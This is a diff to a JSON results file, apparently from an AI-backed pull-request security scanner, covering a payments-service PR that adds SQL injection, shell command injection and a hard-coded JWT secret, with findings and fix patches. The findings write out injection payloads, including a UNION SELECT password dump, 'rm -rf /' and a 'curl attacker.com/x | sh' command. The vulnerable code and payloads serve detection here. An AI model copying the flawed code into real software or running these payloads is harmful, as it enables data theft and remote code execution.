@@ -1,18 +1,53 @@
 {
   "schema_version": 1,
-  "generated_at": 1789300000,
-  "generator": "placeholder — hand-built from hackathon eval output; replaced by real scanner output",
+  "generated_at": 1789414437,
+  "generator": "secpr 0.1.0-dev · claude-opus-5",
   "pr": {
     "repo": "acme/payments",
     "number": 142,
     "title": "Implement user search, shell out for health pings, hardcode dev JWT secret",
-    "head_sha": "3f2a9c1d",
+    "head_sha": "cbd9ece3ccb1b52183bcca402dba59b5ef22b023",
     "files": [
+      {
+        "filename": "README.md",
+        "language": "unknown",
+        "status": "modified",
+        "patch": "@@ -5,4 +5,5 @@ Internal payments service for Acme.\n ## Endpoints\n \n - `POST /transfers` — move funds between accounts\n-- `GET /health` — liveness probe\n+- `GET /users/search?q=<name>` — look up accounts by display name\n+- `GET /health?host=<upstream>` — liveness probe with an upstream ping",
+        "source": "",
+        "added_lines": [
+          8,
+          9
+        ],
+        "chunks": []
+      },
+      {
+        "filename": "internal/auth/token.go",
+        "language": "go",
+        "status": "modified",
+        "patch": "@@ -2,7 +2,6 @@ package auth\n \n import (\n \t\"errors\"\n-\t\"os\"\n \t\"time\"\n \n \t\"github.com/golang-jwt/jwt/v5\"\n@@ -29,10 +28,8 @@ func NewClaims(userID string, ttl time.Duration) Claims {\n }\n \n func signToken(claims jwt.Claims) (string, error) {\n-\tsecret := []byte(os.Getenv(\"JWT_SECRET\"))\n-\tif len(secret) == 0 {\n-\t\treturn \"\", errors.New(\"JWT_SECRET not configured\")\n-\t}\n+\t// TODO: switch back to the env var before release\n+\tsecret := []byte(\"supersecret123\")\n \ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n \treturn token.SignedString(secret)\n }",
+        "source": "package auth\n\nimport (\n\t\"errors\"\n\t\"time\"\n\n\t\"github.com/golang-jwt/jwt/v5\"\n)\n\n// ErrInvalidToken is returned for any token that fails signature or claim checks.\nvar ErrInvalidToken = errors.New(\"auth: invalid token\")\n\n// Claims is the payload embedded in every session token.\ntype Claims struct {\n\tUserID string `json:\"uid\"`\n\tjwt.RegisteredClaims\n}\n\nfunc NewClaims(userID string, ttl time.Duration) Claims {\n\tnow := time.Now()\n\treturn Claims{\n\t\tUserID: userID,\n\t\tRegisteredClaims: jwt.RegisteredClaims{\n\t\t\tIssuedAt:  jwt.NewNumericDate(now),\n\t\t\tExpiresAt: jwt.NewNumericDate(now.Add(ttl)),\n\t\t},\n\t}\n}\n\nfunc signToken(claims jwt.Claims) (string, error) {\n\t// TODO: switch back to the env var before release\n\tsecret := []byte(\"supersecret123\")\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n\treturn token.SignedString(secret)\n}\n\nfunc parseToken(raw string, secret []byte) (*Claims, error) {\n\tvar claims Claims\n\ttoken, err := jwt.ParseWithClaims(raw, &claims, func(t *jwt.Token) (any, error) {\n\t\tif _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {\n\t\t\treturn nil, ErrInvalidToken\n\t\t}\n\t\treturn secret, nil\n\t})\n\tif err != nil || !token.Valid {\n\t\treturn nil, ErrInvalidToken\n\t}\n\treturn &claims, nil\n}\n",
+        "added_lines": [
+          31,
+          32
+        ],
+        "chunks": [
+          {
+            "function_name": "signToken",
+            "kind": "function",
+            "start_line": 30,
+            "end_line": 35,
+            "changed_lines": [
+              31,
+              32
+            ]
+          }
+        ]
+      },
       {
         "filename": "internal/handlers/search.go",
         "language": "go",
         "status": "modified",
-        "patch": "@@ -3,7 +3,6 @@\n import (\n \t\"database/sql\"\n \t\"encoding/json\"\n-\t\"errors\"\n \t\"net/http\"\n )\n \n@@ -39,7 +38,12 @@\n }\n \n func searchUsers(db *sql.DB, q string) ([]User, error) {\n-\treturn nil, errors.New(\"search: not implemented\")\n+\trows, err := db.Query(\"SELECT * FROM users WHERE name = '\" + q + \"'\")\n+\tif err != nil {\n+\t\treturn nil, err\n+\t}\n+\tdefer rows.Close()\n+\treturn scanUsers(rows)\n }\n \n func scanUsers(rows *sql.Rows) ([]User, error) {",
+        "patch": "@@ -3,7 +3,6 @@ package handlers\n import (\n \t\"database/sql\"\n \t\"encoding/json\"\n-\t\"errors\"\n \t\"net/http\"\n )\n \n@@ -39,7 +38,12 @@ func (h *SearchHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n }\n \n func searchUsers(db *sql.DB, q string) ([]User, error) {\n-\treturn nil, errors.New(\"search: not implemented\")\n+\trows, err := db.Query(\"SELECT * FROM users WHERE name = '\" + q + \"'\")\n+\tif err != nil {\n+\t\treturn nil, err\n+\t}\n+\tdefer rows.Close()\n+\treturn scanUsers(rows)\n }\n \n func scanUsers(rows *sql.Rows) ([]User, error) {",
         "source": "package handlers\n\nimport (\n\t\"database/sql\"\n\t\"encoding/json\"\n\t\"net/http\"\n)\n\n// User is the public projection of an account row.\ntype User struct {\n\tID    int64  `json:\"id\"`\n\tName  string `json:\"name\"`\n\tEmail string `json:\"email\"`\n}\n\n// SearchHandler serves GET /users/search?q=<name>.\ntype SearchHandler struct {\n\tdb *sql.DB\n}\n\nfunc NewSearchHandler(db *sql.DB) *SearchHandler {\n\treturn &SearchHandler{db: db}\n}\n\nfunc (h *SearchHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n\tq := r.URL.Query().Get(\"q\")\n\tif q == \"\" {\n\t\thttp.Error(w, \"missing q\", http.StatusBadRequest)\n\t\treturn\n\t}\n\tusers, err := searchUsers(h.db, q)\n\tif err != nil {\n\t\thttp.Error(w, \"search failed\", http.StatusInternalServerError)\n\t\treturn\n\t}\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tjson.NewEncoder(w).Encode(users)\n}\n\nfunc searchUsers(db *sql.DB, q string) ([]User, error) {\n\trows, err := db.Query(\"SELECT * FROM users WHERE name = '\" + q + \"'\")\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tdefer rows.Close()\n\treturn scanUsers(rows)\n}\n\nfunc scanUsers(rows *sql.Rows) ([]User, error) {\n\tvar out []User\n\tfor rows.Next() {\n\t\tvar u User\n\t\tif err := rows.Scan(&u.ID, &u.Name, &u.Email); err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\tout = append(out, u)\n\t}\n\treturn out, rows.Err()\n}\n",
         "added_lines": [
           41,
@@ -35,52 +70,6 @@
               44,
               45,
               46
-            ]
-          }
-        ]
-      },
-      {
-        "filename": "internal/ops/health.go",
-        "language": "go",
-        "status": "modified",
-        "patch": "@@ -33,7 +33,8 @@\n }\n \n func pingHost(host string) ([]byte, error) {\n-\treturn exec.Command(\"ping\", \"-c\", \"1\", host).Output()\n+\t// Go through the shell so operators can pass extra ping flags in the host param.\n+\treturn exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).Output()\n }\n \n func (c *Checker) withTimeout(ctx context.Context) (context.Context, context.CancelFunc) {",
-        "source": "package ops\n\nimport (\n\t\"context\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"time\"\n)\n\n// Checker probes upstream hosts so the payments service can fail fast\n// when a downstream dependency is unreachable.\ntype Checker struct {\n\tTimeout time.Duration\n}\n\nfunc NewChecker() *Checker {\n\treturn &Checker{Timeout: 3 * time.Second}\n}\n\nfunc (c *Checker) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n\thost := r.URL.Query().Get(\"host\")\n\tif host == \"\" {\n\t\thttp.Error(w, \"missing host\", http.StatusBadRequest)\n\t\treturn\n\t}\n\tout, err := pingHost(host)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusBadGateway)\n\t\treturn\n\t}\n\tw.Header().Set(\"Content-Type\", \"text/plain\")\n\tw.Write(out)\n}\n\nfunc pingHost(host string) ([]byte, error) {\n\t// Go through the shell so operators can pass extra ping flags in the host param.\n\treturn exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).Output()\n}\n\nfunc (c *Checker) withTimeout(ctx context.Context) (context.Context, context.CancelFunc) {\n\treturn context.WithTimeout(ctx, c.Timeout)\n}\n",
-        "added_lines": [
-          36,
-          37
-        ],
-        "chunks": [
-          {
-            "function_name": "pingHost",
-            "kind": "function",
-            "start_line": 35,
-            "end_line": 38,
-            "changed_lines": [
-              36,
-              37
-            ]
-          }
-        ]
-      },
-      {
-        "filename": "internal/auth/token.go",
-        "language": "go",
-        "status": "modified",
-        "patch": "@@ -2,7 +2,6 @@\n \n import (\n \t\"errors\"\n-\t\"os\"\n \t\"time\"\n \n \t\"github.com/golang-jwt/jwt/v5\"\n@@ -29,10 +28,8 @@\n }\n \n func signToken(claims jwt.Claims) (string, error) {\n-\tsecret := []byte(os.Getenv(\"JWT_SECRET\"))\n-\tif len(secret) == 0 {\n-\t\treturn \"\", errors.New(\"JWT_SECRET not configured\")\n-\t}\n+\t// TODO: switch back to the env var before release\n+\tsecret := []byte(\"supersecret123\")\n \ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n \treturn token.SignedString(secret)\n }",
-        "source": "package auth\n\nimport (\n\t\"errors\"\n\t\"time\"\n\n\t\"github.com/golang-jwt/jwt/v5\"\n)\n\n// ErrInvalidToken is returned for any token that fails signature or claim checks.\nvar ErrInvalidToken = errors.New(\"auth: invalid token\")\n\n// Claims is the payload embedded in every session token.\ntype Claims struct {\n\tUserID string `json:\"uid\"`\n\tjwt.RegisteredClaims\n}\n\nfunc NewClaims(userID string, ttl time.Duration) Claims {\n\tnow := time.Now()\n\treturn Claims{\n\t\tUserID: userID,\n\t\tRegisteredClaims: jwt.RegisteredClaims{\n\t\t\tIssuedAt:  jwt.NewNumericDate(now),\n\t\t\tExpiresAt: jwt.NewNumericDate(now.Add(ttl)),\n\t\t},\n\t}\n}\n\nfunc signToken(claims jwt.Claims) (string, error) {\n\t// TODO: switch back to the env var before release\n\tsecret := []byte(\"supersecret123\")\n\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)\n\treturn token.SignedString(secret)\n}\n\nfunc parseToken(raw string, secret []byte) (*Claims, error) {\n\tvar claims Claims\n\ttoken, err := jwt.ParseWithClaims(raw, &claims, func(t *jwt.Token) (any, error) {\n\t\tif _, ok := t.Method.(*jwt.SigningMethodHMAC); !ok {\n\t\t\treturn nil, ErrInvalidToken\n\t\t}\n\t\treturn secret, nil\n\t})\n\tif err != nil || !token.Valid {\n\t\treturn nil, ErrInvalidToken\n\t}\n\treturn &claims, nil\n}\n",
-        "added_lines": [
-          31,
-          32
-        ],
-        "chunks": [
-          {
-            "function_name": "signToken",
-            "kind": "function",
-            "start_line": 30,
-            "end_line": 35,
-            "changed_lines": [
-              31,
-              32
             ]
           }
         ]
@@ -116,33 +105,58 @@
             ]
           },
           {
-            "function_name": "chunk@1-39",
+            "function_name": "chunk@1-38",
             "kind": "window",
             "start_line": 1,
-            "end_line": 39,
+            "end_line": 38,
             "changed_lines": [
               4,
-              8,
-              9
+              8
             ]
           }
         ]
       },
       {
-        "filename": "README.md",
-        "language": "unknown",
+        "filename": "internal/ops/health.go",
+        "language": "go",
         "status": "modified",
-        "patch": "@@ -5,4 +5,5 @@\n ## Endpoints\n \n - `POST /transfers` — move funds between accounts\n-- `GET /health` — liveness probe\n+- `GET /users/search?q=<name>` — look up accounts by display name\n+- `GET /health?host=<upstream>` — liveness probe with an upstream ping",
-        "source": "# payments\n\nInternal payments service for Acme.\n\n## Endpoints\n\n- `POST /transfers` — move funds between accounts\n- `GET /users/search?q=<name>` — look up accounts by display name\n- `GET /health?host=<upstream>` — liveness probe with an upstream ping\n",
+        "patch": "@@ -33,7 +33,8 @@ func (c *Checker) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n }\n \n func pingHost(host string) ([]byte, error) {\n-\treturn exec.Command(\"ping\", \"-c\", \"1\", host).Output()\n+\t// Go through the shell so operators can pass extra ping flags in the host param.\n+\treturn exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).Output()\n }\n \n func (c *Checker) withTimeout(ctx context.Context) (context.Context, context.CancelFunc) {",
+        "source": "package ops\n\nimport (\n\t\"context\"\n\t\"net/http\"\n\t\"os/exec\"\n\t\"time\"\n)\n\n// Checker probes upstream hosts so the payments service can fail fast\n// when a downstream dependency is unreachable.\ntype Checker struct {\n\tTimeout time.Duration\n}\n\nfunc NewChecker() *Checker {\n\treturn &Checker{Timeout: 3 * time.Second}\n}\n\nfunc (c *Checker) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n\thost := r.URL.Query().Get(\"host\")\n\tif host == \"\" {\n\t\thttp.Error(w, \"missing host\", http.StatusBadRequest)\n\t\treturn\n\t}\n\tout, err := pingHost(host)\n\tif err != nil {\n\t\thttp.Error(w, err.Error(), http.StatusBadGateway)\n\t\treturn\n\t}\n\tw.Header().Set(\"Content-Type\", \"text/plain\")\n\tw.Write(out)\n}\n\nfunc pingHost(host string) ([]byte, error) {\n\t// Go through the shell so operators can pass extra ping flags in the host param.\n\treturn exec.Command(\"sh\", \"-c\", \"ping -c 1 \"+host).Output()\n}\n\nfunc (c *Checker) withTimeout(ctx context.Context) (context.Context, context.CancelFunc) {\n\treturn context.WithTimeout(ctx, c.Timeout)\n}\n",
         "added_lines": [
-          8,
-          9
+          36,
+          37
         ],
-        "chunks": []
+        "chunks": [
+          {
+            "function_name": "pingHost",
+            "kind": "function",
+            "start_line": 35,
+            "end_line": 38,
+            "changed_lines": [
+              36,
+              37
+            ]
+          }
+        ]
       }
     ]
   },
   "findings": [
+    {
+      "id": "F-65aed72c",
+      "repo": "acme/payments",
+      "pr": 142,
+      "file": "internal/auth/token.go",
+      "line": 32,
+      "cwe": "CWE-798",
+      "severity": "CRITICAL",
+      "summary": "The JWT signing secret is a hard-coded string literal ('supersecret123') in signToken instead of being loaded from configuration or environment.",
+      "why_it_matters": "Anyone with access to the source or binary can extract the secret and forge arbitrary JWTs (e.g. an admin token), fully bypassing authentication.",
+      "fix_patch": "\tsecret := []byte(os.Getenv(\"JWT_SIGNING_SECRET\"))\n\tif len(secret) == 0 {\n\t\treturn \"\", errors.New(\"JWT_SIGNING_SECRET is not set\")\n\t}",
+      "confidence": 0.99,
+      "created_at": 1789414419,
+      "status": "open"
+    },
     {
       "id": "F-78120bfd",
       "repo": "acme/payments",
@@ -151,11 +165,11 @@
       "line": 41,
       "cwe": "CWE-89",
       "severity": "HIGH",
-      "summary": "User-supplied 'q' is concatenated directly into a SQL string without parameterisation.",
-      "why_it_matters": "An attacker can append OR 1=1-- to dump the entire users table, or use UNION SELECT to exfiltrate arbitrary data.",
+      "summary": "The user-supplied 'q' parameter is concatenated directly into the SQL query string in searchUsers without parameterisation or escaping.",
+      "why_it_matters": "An attacker can submit a search term like ' OR '1'='1 or ' UNION SELECT password FROM users-- to dump every user record including credentials.",
       "fix_patch": "\trows, err := db.Query(\"SELECT * FROM users WHERE name = ?\", q)",
       "confidence": 0.99,
-      "created_at": 1789300000,
+      "created_at": 1789414419,
       "status": "open"
     },
     {
@@ -166,48 +180,18 @@
       "line": 37,
       "cwe": "CWE-78",
       "severity": "CRITICAL",
-      "summary": "Command injection vulnerability through unsanitized host parameter concatenated into shell command",
-      "why_it_matters": "An attacker can inject arbitrary shell commands by providing malicious input like '127.0.0.1; rm -rf /' to execute unauthorized commands on the system",
-      "fix_patch": "\treturn exec.Command(\"ping\", \"-c\", \"1\", host).Output()",
+      "summary": "The 'host' parameter is concatenated into a shell command executed via sh -c in pingHost, allowing arbitrary command injection.",
+      "why_it_matters": "An attacker supplying a host like '127.0.0.1; curl attacker.com/x | sh' achieves remote code execution as the service user.",
+      "fix_patch": "\treturn exec.Command(\"ping\", \"-c\", \"1\", \"--\", host).Output()",
       "confidence": 0.99,
-      "created_at": 1789300000,
-      "status": "open"
-    },
-    {
-      "id": "F-65aed72c",
-      "repo": "acme/payments",
-      "pr": 142,
-      "file": "internal/auth/token.go",
-      "line": 32,
-      "cwe": "CWE-798",
-      "severity": "CRITICAL",
-      "summary": "Hard-coded JWT signing secret embedded in source code",
-      "why_it_matters": "Attackers with source code access can forge valid tokens and impersonate any user",
-      "fix_patch": "\tsecret := []byte(os.Getenv(\"JWT_SECRET\"))\n\tif len(secret) == 0 {\n\t\treturn \"\", errors.New(\"JWT_SECRET not configured\")\n\t}",
-      "confidence": 0.99,
-      "created_at": 1789300000,
-      "status": "open"
-    },
-    {
-      "id": "F-0a6f03e6",
-      "repo": "acme/payments",
-      "pr": 142,
-      "file": "internal/auth/token.go",
-      "line": 32,
-      "cwe": "CWE-326",
-      "severity": "MEDIUM",
-      "summary": "Weak cryptographic secret with insufficient entropy",
-      "why_it_matters": "The 14-character secret is vulnerable to brute-force attacks allowing token forgery",
-      "fix_patch": "\t// Use a cryptographically secure secret of at least 32 bytes\n\t// Example: generated via: openssl rand -base64 32\n\tsecret := []byte(os.Getenv(\"JWT_SECRET\"))",
-      "confidence": 0.95,
-      "created_at": 1789300000,
+      "created_at": 1789414419,
       "status": "open"
     }
   ],
   "stats": {
-    "files": 5,
+    "files": 4,
     "chunks": 5,
     "llm_calls": 5,
-    "duration_ms": 8400
+    "duration_ms": 17727
   }
 }
